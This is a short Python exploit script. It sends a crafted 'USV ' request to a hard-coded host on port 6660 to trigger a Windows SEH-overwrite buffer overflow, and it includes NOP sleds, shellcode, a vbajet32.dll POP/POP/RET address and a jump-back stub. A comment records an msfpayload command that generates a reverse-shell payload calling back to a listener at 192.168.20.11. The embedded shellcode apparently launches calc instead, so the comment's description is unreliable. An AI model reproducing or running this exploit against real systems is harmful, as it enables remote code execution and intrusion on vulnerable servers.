#!/usr/bin/python
import socket

target_address="172.20.10.5"
target_port=6660

buffer = "USV "
buffer+= "\x90" * 194
buffer+= "\x90" * 16 # Jump code lands here on 16 NOPS
# msfpayload windows/shell_reverse_tcp LHOST=192.168.20.11 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0d\x20\x25' -s 619 -t c - x86/shikata_ga_nai - size 342 bytes
buffer+= (
    "\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
    "\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
    "\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
    "\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
    "\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
    "\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
buffer+= "\x90" * (966 - len(buffer)) # 962 + 4 to account for "USV " is offset
buffer+= "\xeb\x06\x90\x90" # JMP SHORT 6, NOP Padding
buffer+= "\x6A\x19\x9A\x0F" # SEH Overwrite 0F9A196A POP EBP, POP EBX, RETN, vbajet32.dll
buffer+= "\x59\x59\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1" # 11 bytes, pop ecx * 3, dec ch (take 256 from ecx) * 3, jmp ecx
buffer+= "\x90" * (2504 - len(buffer))
buffer+= "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()